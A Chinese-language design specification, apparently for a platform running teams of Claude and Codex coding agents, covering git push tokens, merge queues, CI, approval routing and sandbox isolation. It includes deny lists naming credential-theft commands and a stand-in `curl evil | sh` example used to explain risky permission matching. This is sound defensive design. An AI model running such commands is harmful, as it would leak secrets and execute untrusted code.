- **平台推送 + 员工自己推送**（§10.4）：成员调用 `push_branch()`（`complete_task` 前平台也会自动调用）→ 控制台给每个仓库发一个 `git.push {job_id, repo, cwd, refspec: "HEAD:refs/heads/thread/<no>/<name>", unchanged_against: [讨论串分支, 基准分支]}` 作业（同一次调用的作业共享 `meta.push_group`，全部回报后工具才返回）；HEAD 在这些分支之外没有提交的仓库，守护进程不推送，回 `unchanged: true`。推送过的仓库记在任务的 `at_tasks.pushed`（repo → sha） → 守护进程用**只为这一个作业**申请的令牌（只给本仓库、`contents: write`）执行 `git push --no-verify origin <固定 refspec>`。refspec 由控制台按员工身份生成，守护进程只接受 `refs/heads/thread/<no>/<employee>` 形式。讨论串分支只由控制台（合并队列，App 令牌）改动。
  2026-11-17 起（用户：“用户会配置 gh 的，要把临时密钥让每个员工都能用上”）组长和成员的会话令牌也能推送分支、开 PR（§10.4），员工可以自己 `git push origin HEAD`、用 `gh`；平台的 `push_branch`/`complete_task` 推送、合并队列、`open_pr` 照旧。保护靠下面的 pre-push 钩子（加上 PreToolUse 的固定拒绝：`git push --no-verify`、`git -c core.hooksPath=…`、`gh auth token`、`git credential`）和建议的 GitHub 规则集。
- **令牌只在守护进程自己的镜像里用**：共享克隆的 `.git` 员工可写（提交要落在那里），其中的 `remote.origin.url`、`url.*.insteadOf`、`http.proxy`、`core.fsmonitor`、过滤器等配置都不可信。所以守护进程为每个仓库在 `state/mirrors/<owner>__<repo>.git`（0700，员工不可读写）维护一个裸镜像：带令牌的 fetch 和 push 只在镜像里做（推送时先把 worktree 的 HEAD 取进镜像，再从镜像推固定 refspec 到固定 URL），共享克隆只从镜像本地 fetch，环境里没有令牌；守护进程在共享克隆和 worktree 里跑的所有 git 命令都用 `-c` 覆盖 `core.fsmonitor`、`core.hooksPath` 并清空已配置的过滤器驱动，环境里剔除 `AGENT_TEAMS_*`。
- **pre-push 钩子**：守护进程把共享克隆及其所有 worktree 的 `core.hooksPath` 设为平台目录（员工不可写，§10.3）里的 `pre-push` 钩子。它拒绝：`AT_PROTECTED_REFS` 里的分支（控制台在 `session.open.env` 里给：讨论串分支、每个仓库本讨论串的基准分支和默认分支）、`main`/`master`/`origin/HEAD` 指向的分支（兜底）、不是自己当前分支的 `thread/*`（别的成员和讨论串的分支）、标签和任何非分支 ref；别的分支（自己的成员分支、新建的 `feature/*` 等）放行。提示里说明合并走合并队列（`enqueue_merge`/`open_pr`）和用户验收。钩子可被 `--no-verify` 或 `-c core.hooksPath` 绕过，PreToolUse 固定拒绝名单拦这两种写法，但员工手里确实有写令牌，所以 `ci/detect` 仍建议用户在仓库建规则集：保护基准分支和 `thread/*`（GitHub 规则集的 `*` 不跨 `/`，因此不覆盖 `thread/<no>/<name>` 成员分支），限制更新与强推，绕过者只设平台 App。
- **workflow 文件**：写令牌不带 `workflows` 权限，GitHub 会拒绝任何改了 `.github/workflows/**` 的推送，所以员工写的 workflow 不可能在 `mq/**`、`thread/**` 的 push 上带着仓库 Actions secrets 运行。需要改 CI 的任务，平台在推送被拒时告诉员工“workflow 变更请写进交付说明，由用户合并”；项目设置里的“允许员工修改 workflow”开关（默认关，打开要二次确认并审计）会让推送作业的令牌带上 `workflows: write`。

### 8.2 合并队列（成员分支 → 讨论串分支，全部在 GitHub 上做，不占节点）

每个讨论串一条队列（`at_merge_queue`），每个仓库一次处理一个条目（不同仓库的队头并行）：

1. 条目进入（组长 `enqueue_merge`，或审查/决策关卡通过后自动进入）：任务推送过的每个仓库一个条目（`at_merge_queue.repo`；`enqueue_merge(repo)` 只合并其中一个）。没有任何改动的任务直接 `done`。任务状态 `merging`；任务在所有仓库都合并后才 `done`。该仓库还没有讨论串分支时先按 §8.1 创建。
2. 建试合并分支：`mq/<no>/<entry_id>` = 讨论串分支当前 head（`POST /git/refs`），然后 `POST /repos/{o}/{r}/merges {base: mq/…, head: thread/<no>/<name>}`。
   - 409 冲突 → 条目 `conflict`，给该成员生成修复任务“把 thread/<no>-<slug> rebase/merge 进你的分支并解决冲突”（`kind: fix`，直接点名该成员），任务回到 `running`。
   - 非合并原因的失败（读讨论串分支、建试合并分支失败等，GitHub 5xx 除外，下一轮重试）→ 条目 `cancelled` 并通知组长；任务从 `merging` 回到 `blocked`（任务的其他仓库还在队列里时等它们走完；其他仓库合并完时也不记 done，而是 `blocked`），组长原因解决后可以再 `enqueue_merge(task_id)`。讨论串分支已记为建过（`branch_created`）但 GitHub 上读到 404（被删、或随已合并的 PR 删掉）时，先从基准分支重新切出再继续（合并队列关卡关掉时的直接合并同样处理），切不出来才按上面取消。重新切出时一定通知组长“讨论串分支 X 在仓库 R 上不存在，已从 B 重新切出”；该仓库的 PR 还没合并时，通知里列出此前合并进旧分支的任务（任务 id、成员、成员分支），说明改动可能不在新分支里：这些任务已是 done，不能再 `enqueue_merge`，要派新任务让成员确认成员分支上的提交后 complete_task 再入队。
3. 等 CI（§8.3）在试合并分支 head 上的结果。
4. 绿 → 快进讨论串分支：`PATCH /git/refs/heads/thread/<no>-<slug> {sha, force:false}`。如果讨论串 head 在此期间变了（422 非快进），回到第 2 步重建（最多 3 次）。
5. 红 → 条目 `ci_failed`，按失败的 check 生成修复任务回池（`kind: fix`，role = 原任务岗位，优先该成员），附上失败 check 的名称、摘要和日志链接（Checks API `output.summary`）。
6. 结束删除 `mq/*` 分支；任务 `done`；主任务打勾判断；发 `merge.*` 事件（机房的“合并队列”面板）。

### 8.3 CI（GitHub Checks）

- 项目设置 `ci`: `{mode: off|checks, required: ["verify", "integration"], appear_timeout_s: 300, timeout_s: 3600}`。`required` 为空 = 所有 check 都要通过。
- 结果来源：**轮询**为基线（`GET /repos/{o}/{r}/commits/{sha}/check-runs`，带 ETag，15 s 一次，只对等待中的 sha），**webhook** 为加速（配置了才用）。
- 试合并分支上要有 CI 跑：workflows 需要 `on: push` 覆盖 `mq/**` 和 `thread/**`。项目设置页检测不到时提示，并提供“帮我开一个 PR 加上触发条件”的按钮（由平台生成一个修改 workflow 的 PR，用户自己合）。
- `appear_timeout_s` 内没有任何 check 出现 → 视为“该仓库没有 CI”，按设置 `on_missing: pass|block` 处理（默认 pass 并在面板标“无 CI”）。
- **权限**：v1 的 App manifest 只有 `contents: write, pull_requests: write, workflows: write, metadata: read`。读 Checks 需要 `checks: read`（以及 `statuses: read` 兼容老式 status）。现有 App 要管理员在 GitHub 上加权限、每个安装方再批准一次（见 §15 风险 R4）。没批准时 CI 关卡自动降级为 `off` 并在讨论串里提示。新建 App 的 manifest 直接带上 `checks: read, statuses: read`，webhook 设为 active，事件 `check_suite, check_run, pull_request`。

### 8.4 PR 与验收

- 组长 `open_pr(title, body)` 或用户在 Thread 页点“开 PR”（`POST /api/threads/{tid}/open-pr`，标题和正文缺省时平台用讨论串标题 + 主任务清单 + 各小任务总结生成）：前提是该讨论串没有 `merging` 中的条目、所有主任务 done（否则返回错误说明还差什么；用户可带 `force: true` 跳过“主任务全部 done”这一条）。平台给每个已有讨论串分支、还没有 PR 的仓库各建一个 PR（head 讨论串分支 → base 本讨论串在该仓库的基准分支；`open_pr(repo, base)` 可只开一个、改 PR 的 base；GitHub 回“No commits between”的仓库跳过），写 `at_thread_repos.pr_*`（`pr_opened_at` 记开 PR 的时间，CI 判断只看这之后的 check；第一个 PR 同时写进 `at_threads.pr_*`，兼容旧客户端），讨论串 → `review`，给统筹发 `[Thread #12 · … · review] <结论>`。
- 验收、自动合并和 CI 判断都针对讨论串**全部**未合并的 PR：全部通过才合并（逐个合并），任何一个失败就按失败处理；PR 全部合并后讨论串才 `done`。webhook 的 `pull_request closed` 按 PR 链接找到 `at_thread_repos` 行。PR 不是交付物：它只记在讨论串上（`at_thread_repos.pr_*`，网页在讨论串里展示），不进资料库；`publish_deliverable`、`publish_file` 和 `POST /api/projects/{pid}/deliverables` 收到 `kind = pr` 都拒绝（00190 起；之前的 `pr` 类交付物由迁移删掉）。
- **合并策略 `merge_policy`**（项目设置“讨论串完成后”，00250 起取代 `require_acceptance`）。三档共用：讨论串开出 PR 后进入 `review`，delivery 引擎轮询 PR head 的 check（与 §8.3 同一套规则：`required`、`appear_timeout_s`、`on_missing`）；check 失败 → 给组长发 `[Thread #12 · CI 失败]`（附失败 check），讨论串回 `running`，由员工修好后再走一遍：组长再调用 `finish(summary)` 或 `open_pr` 把讨论串**重新提交**到 `review`（PR 已存在时不再报“已经开过 PR”；`pr_state` 回到 `open`、清空 `merge_error`、检查重新评估；前提和开 PR 相同：合并队列为空、主任务全部完成、没有未完成的小任务，否则拒绝并说明还差什么）。用户 reject 退回 `running` 后同样这样重新提交。PR 上一直没有出现项目要求的 check（`on_missing = fail`，`CIMissing`）不算 CI 失败：讨论串留在 `review`，`merge_error` 写“PR 上没有出现项目要求的 CI 检查，无法合并”，算“等你处理”，不通知组长（组长修不了）。
  - **`pr`（默认，“提交 PR 即完成”）**：check 全部通过 → 讨论串 `done`（PR 保持打开，`pr_state = open`）并通知统筹；PR 留在 GitHub 上由人合并，之后 webhook 收到合并只把 `pr_state` 记为 `merged`。整个过程不等用户，`review` 期间不算“等你处理”。
  - **`auto`（“自动合并”，需要用户在设置里打开 = 授权平台合并）**：check 全部通过且 PR 可合并时用 `merge_method` 合并进基准分支，→ `done` 并通知统筹；合并冲突（基准分支前进）→ 给组长发修复指令，回 `running`。`review` 期间不算“等你处理”。
  - **`manual`（“我来验收”，原来 `require_acceptance` 开的行为）**：讨论串停在 `review` 等用户，算“等你处理”，对话底部是验收卡片。用户 `POST /api/threads/{id}/accept` → 平台等 PR head 上的必需 check 通过后合并 PR（`PUT /pulls/{n}/merge`，方法按 `delivery.merge_method` squash|merge|rebase，默认 squash），→ `done`。`reject {reason}` → 原因作为消息发给组长，→ `running`。
  - accept / reject 接口三档都可用：`pr` / `auto` 下 accept 是“不等了，现在合并”，reject 在完成或自动合并前拦下。合并失败（`merge_error`）的讨论串三档都算“等你处理”。
  - 迁移 00250：原 `require_acceptance = true`（旧默认）的项目改为 `pr`，`false` 的改为 `auto`。
- **结束不切断组长**（00311）：上面三档里“→ `done`”的自动结束（`pr` 的 check 通过、`auto` / `manual` 合并完成、webhook 收到人工合并，以及只读讨论串的 `finish`）都走同一个入口（`delivery/finish.go` 的 `endThread`，在讨论串行锁里执行，多副本幂等）：
  - 还有未完成的小任务，或合并队列里还有活动条目时不结束；PR 的 `merged` 照常记录并推送，讨论串留在原状态。合并循环每一轮（`doneTick`）检查 `pr_state = merged` 但还没结束的讨论串，条件消失后自动结束；组长调用 `finish` 时也会再检查一次。
  - 组长正在回合中（会话 `in_turn`）时不立即结束，记 `at_threads.done_pending_at`；组长 `turn_ended`（最终回复的 `text final` 在它之前入库）时结束。
  - 组长空闲但从没调用过 `finish(summary)`（summary 为空）时，给组长发一次“（平台）[Thread #n · 可以收尾]”提示（`finish_nudged_at`，每个讨论串只发一次），它回应提示的那一回合结束后结束。
  - 兜底：`done_pending_at` 超过 10 分钟（`delivery.DoneGrace`）合并循环直接结束讨论串，不再等组长。
  - check 重新变成进行中、check 失败或 reject 时清掉 `done_pending_at`，等下一次通过。
  - 通知统筹的 `[Thread #n · … · done]` 那一行：有 summary 用 summary 的第一行，否则用组长最新的回复。
  - 用户在页面上“标记完成”（`POST /api/threads/{tid}/complete`）和归档不走这个入口，立即生效。
- `done/archived` 后：所有会话 `session.close`，对涉及的节点按共享克隆各发一个 `git.cleanup`（有未推送提交的 worktree 保留并回报），远端在每个仓库删除 `thread/<no>/*` 成员分支（讨论串分支随 PR 合并删除）。
- **凭证按仓库**：推送/准备作业的 `cred.request` 只能拿到作业自己那个仓库（`body.repo`）的令牌，用该仓库绑定的 Git 连接铸造；员工会话可以拿项目的任何一个仓库的令牌（每次只缩小到一个仓库）。
- **员工用 gh 开的 PR**：讨论串的 PR 约定由组长用 `open_pr` 开（提示词这样写，平台据此跟踪验收、CI 和合并）；员工用 gh 为别的分支开 PR、评论、看 issue 都可以。如果有人已经用 gh 从讨论串分支向基准分支开了 PR，`open_pr` 建 PR 时 GitHub 回 422 “A pull request already exists”，平台按 `head=<owner>:<讨论串分支>&base=<基准>` 查到那个打开的 PR 并接管（写 `at_thread_repos.pr_*`，之后和平台自己开的 PR 一样）。员工开 PR 不会自动挂到讨论串上，要等 `open_pr`。CI 检测（`GET /api/projects/{pid}/ci/detect?repo=`）按仓库，读该仓库默认分支上的 workflow。

## 9. 审批端到端

```
Claude 子进程                守护进程                      控制台                         网页
 │ 需要权限                    │                             │                              │
 ├─canUseTool(tool,input,opts)►│ approval_id = sha256(session│                              │
 │                             │   + toolUseID)              │                              │
 │                             ├─WS approval.request ───────►│ 写 at_questions(kind=approval)│
 │                             │                             │ 策略：角色跳过? 串内全放行?    │
 │                             │                             │ 记住的规则匹配? 只读白名单?   │
 │                             │◄── approval.resolve(allow) ─┤ ├─ 命中：直接回（记 decided_by）│
 │                             │                             │ └─ 未命中：SSE question ─────►│ 审批卡片
 │                             │                             │◄─ POST …/answer allow_always ─┤ 放行/总是允许/拒绝
 │                             │◄── approval.resolve ────────┤ 存规则(at_permission_rules)    │
 │◄─{behavior:'allow',         │                             │ 同员工同规则的其他待审批自动放行│
 │   updatedPermissions?}──────┤── approval.ack ────────────►│                              │
```

- **Claude**：`canUseTool` 返回的 Promise 一直挂着（SDK 说明无等待上限）。`allow_always` → 返回 `updatedPermissions = options.suggestions`（每条的 `destination` 一律改写为 `session`），同时控制台把这些 `PermissionUpdate` **原样**存进 `at_permission_rules.sdk_update`；以后同一员工（或规则范围内的员工）每次 `session.open`/resume，控制台把范围内的 `addRules`/`allow` 规则展开成 `claude.allowed_tools`（如 `Bash(pnpm add:*)`）下发，由 **Claude 自己的规则匹配器**判断（它正确处理 `&&`、`;`、`|`、`$()` 等复合命令和路径规则）。拒绝 → `{behavior:'deny', message:'用户拒绝了这个操作：<理由>'}`。`opts.signal` 中止（回合被打断 / 会话关闭）→ 守护进程发 `approval.cancel`，卡片变“已取消”。**绝不返回 `null`**（会让工具永远卡住）。
- **Codex**：`item/commandExecution/requestApproval`、`item/fileChange/requestApproval`、`item/permissions/requestApproval`、`mcpServer/elicitation/request` 都映射为同一种 `approval.request`（带 `kind` 和原始参数，fileChange 附 diff）。答复映射：allow → `accept`、allow_always → `acceptForSession`、deny → `decline`。收到 `serverRequest/resolved` → 视同 cancel。
- **策略顺序**（控制台 `approvals.Decide`）：⓪ **固定拒绝名单**（无论哪条策略都先过它，见 §10.3：读取或改动守护进程目录、`node.env`、凭证文件、其他项目目录，`curl|wget` 管道到 shell 等；命中直接 deny 并告警）→ ① 岗位 `permission_mode: bypass`（这种会话以 bypass 模式开，守护进程在 `canUseTool` 里就地放行，正常不会来；旧守护进程发来时直接放行并告警）→ ② 讨论串 `auto_approve`（“本讨论串内全部放行”，任何节点都能开，只影响 `ask` 岗位）→ ③ `at_permission_rules` 的**精确匹配**：同一工具且输入的规范化 hash 相同（`input_hash`），或该工具没有有意义的参数（例如某个平台外 MCP 工具整体放行）。**控制台不解析、不匹配 Claude 规则字符串**（`Bash(pnpm add:*)` 这类前缀规则只交给 Claude 本身，见上；用 Go 重写匹配器会放过 `pnpm add x && curl evil | sh`）→ ④ **只读命令白名单**（`approvals/readonly.go`，`decided_by = policy:rule:builtin-read-only`）：只对只读岗位（`read_only`、`gate: review|decision` 的审查/决策岗位，以及组长）生效，只看 `Bash`（及 Codex 的字符串 `shell`）命令。按 shell 规则切词，出现任何操作符、重定向、`$` / 反引号展开、`!`、`#`、换行（单引号里的除外；双引号里的 `$`、反引号、`\`、`!` 也算）就不算；参数里有绝对路径、`~` 开头或 `..` 也不算（只读工作目录；短选项后直接带的值如 `-f/etc/x` 也算）；未加引号的通配符：能匹配到 `.`/`..` 的（`.*`、`.?`、方括号）一律不算，`find`、`sed`、`rg`、`git`、`tail` 带未加引号的通配符也不算（仓库里叫 `-delete`、`--pre=x` 的文件会被展开成选项）；被拒的选项按 git 的缩写规则匹配（`--outp=` 等同 `--output=`），短选项合写（`rg -nz`）也算；剩下的命令必须是 `ls`、`cat`、`head`、`tail`（不带 `-f`）、`wc`、`pwd`、`grep`、`rg`（不带 `--pre`、`-z`、`--hostname-bin`）、`find`（不带 `-exec`/`-delete`/`-fprint` 等）、`sed -n <行号范围>p 文件…`、`git log|status|diff|show|rev-parse|ls-files|blame|merge-base`（不带 `--output`、`--ext-diff`、`--textconv`、`--git-dir` 等）或列表形式的 `git branch`。写操作永远不会被它放行 → ⑤ 出卡片，按项目的审批方式路由（§9.2）：先给组长判断，或直接给用户。
- **“本讨论串内全部放行”打开时**：控制台对该串所有 Claude 会话发 `session.set_mode {permission_mode:'acceptEdits'}`（文件编辑免问；其余仍走策略 ② 自动放行），并把当前所有待审批（包括正在等组长判断的）一次性放行（仍先过 ⓪）。关闭时改回各自岗位的模式（`default`；bypass 会话不动）。这样大部分请求在节点本地就不再往返。
- **断线**：守护进程重连后重发所有**仍挂着**的 `approval.request`（同 `approval_id` 幂等）；控制台重发所有已决定但未 `ack` 的 `approval.resolve`。
- **进程重启后的孤儿卡片**：`canUseTool` 的 Promise 和 app-server 的 JSON-RPC 请求随进程消失（守护进程重启、app-server 重启、会话崩溃后自动 resume）。守护进程重启时丢弃发件箱里对应 Promise 已不存在的 `approval.request`/`tool.call`，改发 `approval.cancel {reason:'process_restarted'}` / `tool.cancel`；控制台收到 `approval.cancel {reason:'process_restarted'}`、`sessions.report`（不在 `pending_approvals` 里的）或 `session.state parked` 时，卡片**不取消**，只标 `detail.detached_at` 继续显示，被打断的员工随恢复消息原样重新发起同一个请求（新 `approval_id`）；控制台按员工 + 工具 + 输入（忽略 `description`）把新请求接回原卡片（换 `approval_id`/`session_id`，去掉 `detached_at`，记 `reattached_at`），卡片原来在组长那里就仍在组长那里；分离期间用户或组长已经作答的，新请求到来时立即按该答复 `approval.resolve`。员工下一个回合结束（`turn_ended`）时还没接回的卡片才标 `cancelled`。`session.state crashed|closed` 照旧把 open 审批标 `cancelled`。阻塞型提问的调用死掉时提问**不取消**：用户之后的答复按非阻塞退路以 `session.send {kind:'answer'}` 送达（§6.3）。
- **超时**：默认不超时。项目设置可配 `approval_timeout_s`（例如 8 h），到期按 deny 处理；从卡片出现在用户面前算起（组长转交的卡片从转交时算）。

### 9.1 岗位的权限模式

`at_roles.permission_mode`：`bypass`（默认）或 `ask`（迁移 00096 把旧的 `skip_permissions` 改成 `permission_mode`；迁移 00097 去掉 `auto`，`auto` 岗位和 `at_employees.spec` 里的岗位副本都改成 `bypass`，Down 把 `bypass` 改回 `auto`）。用户的决定：讨论串里不再弹权限确认，员工直接执行；只有员工自己用 `ask_user`（或组长、统筹用提问工具）停下来请用户确认时，用户才需要回答。

| 模式 | Claude | Codex |
| --- | --- | --- |
| `bypass`（默认，网页上叫“直接执行”） | `bypassPermissions` + `allowDangerouslySkipPermissions`，**任何节点**（不再要求隔离）。不调 `canUseTool`；CLI 自己的安全检查（例如写 `.git`、`.claude` 下的文件）仍会调到时，守护进程在 `canUseTool` 里就地放行，不发 `approval.request`、不出卡片 | `danger-full-access` + `never`，任何节点 |
| `ask`（“逐条问”） | `default`：除读文件外每个调用都走 `canUseTool` → 审批策略和路由（§9.2） | `workspace-write` + `untrusted`（只有它信任的只读命令免申请） |

不受权限模式影响、始终生效的限制，都以 PreToolUse 钩子的 **deny** 返回给模型（作为工具结果，不出卡片）：

- 统筹永远只有平台工具（`tools: []`、`disallowedTools`、`dontAsk`，钩子拒绝一切非平台工具）。
- 只读岗位（组长、`read_only`、审查/决策岗）永远 `dontAsk` + 只读策略（禁写工具、Bash 走 argv 白名单），权限模式对它们不生效；`dontAsk` 下没预批准的工具直接拒绝，不会调 `canUseTool`。
- 固定拒绝名单（§10.3：守护进程配置和状态目录、运行时登录、`curl|wget` 管道到 shell、改 git hooks/凭证配置等）。文件路径先按字面、再按解析符号链接后的真实路径检查。

`auto` 时期“写到工作目录外改成询问”的钩子规则已删除：bypass 下没有询问，工作目录外的写入照常执行，只有固定拒绝名单里的路径会被拒绝。守护进程不以 root 运行（CLI 拒绝 root 下的 `--dangerously-skip-permissions`），节点安装脚本本来就用普通用户。

### 9.2 审批路由：组长先判断

只对 `ask` 岗位有意义（`bypass` 岗位不产生权限请求）；网页上只有用户的岗位里有 `ask` 成员时才显示这一项和“新讨论串默认全部放行”。项目设置“审批方式”（`delivery.approval_routing`）：`lead_first`（默认，“组长先判断，拿不准再问我”）或 `user`（“全部问我”）。

- 策略 ⓪–④ 都没定下来的卡片，在 `lead_first` 下 `audience = 'lead'`，组长收到一条消息 `[Permission request q5 from dev-1 · t3]`，内容只有用户卡片上显示的东西（工具名、标题、说明、原因、命令或参数，参数截断到 2000 字），再无其他会话信息。用户的“等你处理”列表、讨论串的 `waiting` 状态都不算这些卡片。
- 组长调用 `review_permission(request_id, decision, reason)`：`allow` / `deny` 直接 `approval.resolve`（`deny` 的理由发给成员）；`ask_user` 把卡片转给用户（`audience = 'user'`，卡片上写“组长 lead-1 拿不准：理由”）。
- 谁能判断：卡片记下组长的员工 id（`detail.reviewer_id`），`review_permission` 只接受这个组长在本讨论串里调用（请求 id 按讨论串查找，成员没有这个工具，提出请求的人不能判断自己的请求）；`reply_to` 不能关闭权限请求。组长的判断、用户的回答和超时转交都先锁住卡片再检查 `status = 'open'` 和 `audience`，同一张卡片只会被定一次。
- 直接给用户的情况：项目设置 `user`；请求来自组长自己（或没有讨论串的会话）；组长在 `lead_review_timeout_s`（默认 120 秒，可选 1/2/5/10 分钟）内没有判断（控制台每 15 秒扫一次）。
- 用户的选择（放行 / 总是允许 / 拒绝并写理由）照旧回到请求者；“全部放行”同样放行正在等组长的卡片。
- 记录：`at_questions.decided_by` 写 `lead:<名字>` / `user:<id>` / `policy:…`，组长的判断和理由另存 `detail.review = {by, decision, reason}`。每次判断都写一行讨论串动态（“lead-1 放行了 dev-1 的请求 Bash npm test（理由）”“你 拒绝了 …”“平台 组长 lead-1 没有及时判断 …”），讨论串的“审批记录”列出最近的判断和判断人。发给守护进程的 `approval.resolve.decided_by` 对组长的判断写 `policy:rule:lead-review`（协议的取值范围不变，旧守护进程也能接收）。

## 10. 安全模型

### 10.1 身份与令牌

| 令牌 | 形式 | 存储 | 生命周期 |
| --- | --- | --- | --- |
| 网页会话 | `token_urlsafe(32)` | 库里只存 sha256（`at_sessions`，与 v1 相同，v1 会话直接可用） | 30 天，v2 增加滑动续期（剩余 < 7 天时续）与每日清理 |
| 节点令牌 | 同上 | 库里只存 sha256（`at_nodes.token_hash`，v1 令牌直接可用）；节点上 `node.env` 0600 | 用户可轮换；轮换即断开 |
| 会话 MCP 秘密（仅 Codex 回环） | 守护进程随机生成，放在 URL 路径里 | 只在守护进程内存，只监听 127.0.0.1 | 到下一次 `thread/start`/`thread/resume` 为止（每次换新，§6.3） |
| GitHub 令牌 | App 安装令牌（1 h，**按仓库和权限缩小**，§10.4）或 PAT | 控制台：PAT 用 Fernet 密封入库；安装令牌只在内存 + Valkey（加密，TTL，缓存键含仓库与权限集） | 节点上**从不落盘**（§10.4） |

- 节点身份只由令牌决定（`?name=` 忽略，同 v1）。P7 加固：注册时守护进程生成 Ed25519 密钥对，之后用挑战签名认证，`node.env` 不再保存可重放的令牌（`at_nodes.public_key`）。
- 网页：SameSite=Lax 会话 cookie 保留（GitHub 回调需要）；v2 增加 CSRF 防护（GitHub 回调路径用签名 state，不受影响）。**分两段上线**，因为 v1 网页从不发 `X-CSRF-Token`，而 P1 起 Go 就在前门处理 v1 网页的写请求：
  - **P1–P5（v1 网页还在）**：cookie 认证的非 GET/HEAD 请求，带了 `X-CSRF-Token` 就必须等于 `agent_teams_csrf` cookie；没带时退回**同源检查**：`Sec-Fetch-Site` 为 `same-origin`（或缺省时 `Origin` 等于 `AGENT_TEAMS_PUBLIC_URL` 的 origin），否则 403。v2 新增的写接口（`/api/threads/*`、`/api/roles*`、`/api/admin/office/*` 等，v1 网页不会调用）和 `platform_version = 2` 用户的会话**始终要求令牌**（v2 网页一定带）。代理给 Python 的请求同样先过这道检查。
  - **P6 起**（v1 网页下线）：所有 cookie 认证的写请求都要求 `X-CSRF-Token`（双提交：`agent_teams_csrf` cookie + 头）。Bearer 认证的请求始终免 CSRF。
  - P1 契约测试覆盖：v1 网页录制的写请求（无令牌、同源头）通过；跨站 `Origin` 被拒；v2 路由无令牌被拒。
- 其余：登录/注册/节点创建限流（Valkey 令牌桶）、审计日志（`at_audit_log`：登录、角色变更、节点令牌、GitHub 连接、审批、验收、跳过确认开关）、修改密码、管理员重置密码（`atctl admin reset-password`）。

### 10.2 统筹不能碰代码（三道防线）

1. **会话配置**（守护进程）：`tools: []`、`disallowedTools` 覆盖全部文件/命令工具、`permissionMode:'dontAsk'`、`settingSources: []`、cwd 是空目录、不下发 git 凭证环境、不做 `git.prepare`。
2. **钩子**（守护进程）：PreToolUse 钩子对任何不是 `mcp__platform__*` 的调用返回 `permissionDecision:'deny'`，与模式无关（这也防 SDK 版本变化导致 `tools: []` 语义改变）。
3. **控制台核对**：守护进程在 `query()` 启动后立即 `await q.initializationResult()`（并查 `mcpServerStatus()`），把工具列表放进 `session.opened`；控制台按角色白名单比对，**通过之前不放行第一条消息**（`first_message` 由守护进程扣住，控制台核对通过后发 `session.release`），不符就 `session.close` 并标红告警。之后每个回合的 `system/init` 再核对一次。统筹的平台工具集里也没有任何能改代码的工具（它只能开讨论串、发话、问用户、记忆）。

**只读会话**（组长，以及 `read_only` 的岗位，如审查、决策）同样三道：

1. 会话配置：`disallowedTools: Edit, Write, NotebookEdit`；Claude Bash 沙箱开启且**没有任何可写路径**（§10.3），`allowUnsandboxedCommands: false`；文件工具（Read/Glob/Grep）由 PreToolUse 钩子限制在 cwd 和共享克隆的 `.git` 内。Codex 用 `sandbox: read-only`。
2. Bash 钩子按 **argv 解析**（不是正则）：只允许 `git log|diff|show|status|rev-parse|ls-files|blame|merge-base`、`git branch` 的列表形式（无位置参数，或只带 `--list`/`-a`/`-r`/`--contains <sha>`/`--merged`）、`gh pr view|diff|checks|list|status|create|comment|review|edit`、`gh issue …`、`gh run list|view`、`gh workflow list|view`、`gh repo view`、`gh search`、`gh release list|view`、`gh auth status`（不含 `gh api`、`gh pr merge|checkout`；Codex 组长的只读沙箱没有网络，用不了 gh）；拒绝 `--output`/`-o`、`--ext-diff`、`--textconv`、`-c`、`--exec-path`、`--git-dir`/`--work-tree` 和任何 shell 元字符、重定向、管道、命令替换。
3. init 工具核对（同上）。

组长要看成员新推的分支：控制台在每条审查类消息（`[Task … done]`、`request_review`、合并队列结果）发给只读会话前，先对它的 worktree 发 `git.prepare {fetch: true}`（只 fetch，不改工作区）；只读会话自己的 Bash 不允许 `git fetch`。

### 10.3 守护进程本机边界

- 只在 `--root` 下创建目录和会话 cwd（与 v1 相同的路径约束）；`additionalDirectories` 一律不给。
- 只能起两类子进程：Agent SDK 内置的 `claude`、锁定版本的 `codex`；协议 1 兼容模式沿用 `--allow` 白名单。
- 控制台下发的命令全部按 Schema 校验，未知字段丢弃，未知类型回 `error{code:'unsupported'}`。

**员工看不到节点上的秘密。** 员工的 Bash、Codex 命令和文件工具如果与守护进程同一个 Unix 用户、同一个 HOME，就能读到 `node.env`（节点令牌）、`~/.claude/.credentials.json`、`$CODEX_HOME/auth.json`、守护进程 `state/`、`node.sock` 和别的会话的 `/proc/<pid>/environ`，一次来自仓库内容的提示注入就能偷走它们。v2 按节点的**隔离级别**处理（守护进程启动时探测，hello 上报 `isolation`，节点页显示）：

| 级别 | 做法 | 允许的功能 |
| --- | --- | --- |
| `agent_user`（推荐） | `install-node.sh --agent-user`（需要 sudo 一次）建一个无特权用户 `at-agent`。守护进程以自己的用户运行，`node.env`、`state/`、`node.sock` 的目录都是 0700 归守护进程用户；员工进程经一个只允许固定参数的 sudoers 规则（或 setuid 小助手）以 `at-agent` 身份启动，HOME = `<root>/agent-home/`，里面只有该运行时需要的登录（`.claude/.credentials.json`、`codex/auth.json`），worktree 目录组可写。员工能读到的只剩“自己所用运行时的登录” | 全部 |
| `sandbox` | 同一用户，但：Claude 会话开启 **Claude Code 的 Bash 沙箱**（`settings.sandbox.enabled = true`，`allowUnsandboxedCommands = false`，`filesystem.denyRead` = 守护进程配置目录、`state/`、`$XDG_RUNTIME_DIR/agent-teams`、其他项目目录、`~/.claude/.credentials.json`、`$CODEX_HOME`；可写路径只有 cwd 和共享克隆的 `.git`），并通过 `settings.permissions.deny` 给 Read/Edit 加同样的路径拒绝，PreToolUse 钩子再把文件工具限制在 cwd 内。员工专用 `HOME=<root>/agent-home/`（不含任何凭证）；Claude 登录通过 `CLAUDE_CONFIG_DIR` 指向守护进程目录，只有 claude 进程本身能读，沙箱里的命令读不到。`node.env`（`~/.config/agent-teams/`，0600）所在目录同样在 `denyRead` 和 Read 拒绝规则里 | Claude 员工的全部功能（`bypass` 成员的 Bash 仍在沙箱里跑，写不到 cwd 和共享 `.git` 以外，命令失败但不弹确认）；**Codex 员工不派到这类节点**（Codex 沙箱只限写不限读，命令读凭证不需要审批，见 §15 R9） |
| `none` | 探测不到 bwrap/用户命名空间，也没有 `at-agent` | Claude 员工的全部功能（含 `bypass`：节点归用户所有，由用户决定）；固定拒绝名单始终生效；Codex 员工不派到这类节点 |

- 岗位的 `bypass` 和讨论串的 `auto_approve` 在任何隔离级别的节点上都生效（用户 2026-11-15 的决定：节点是用户自己的，讨论串里不再弹权限确认）。隔离级别仍决定秘密路径怎么挡：`agent_user` 靠 Unix 用户，`sandbox` 靠 Bash 沙箱，所有级别都有 PreToolUse 钩子的固定拒绝名单。
